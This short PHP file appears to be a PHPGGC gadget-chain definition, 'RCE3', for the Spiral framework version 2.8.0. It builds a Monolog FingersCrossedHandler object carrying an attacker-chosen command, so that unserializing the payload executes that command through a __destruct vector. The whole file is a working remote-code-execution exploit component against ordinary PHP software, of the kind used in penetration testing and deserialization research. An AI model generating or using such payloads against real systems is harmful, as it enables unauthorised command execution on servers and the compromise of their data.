<?php

namespace GadgetChain\Spiral;

class RCE3 extends \PHPGGC\GadgetChain\RCE\Command
{
    public static $version = '2.8.0';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $command = $parameters['command'];

        return new \Monolog\Handler\FingersCrossedHandler($command);
    }
}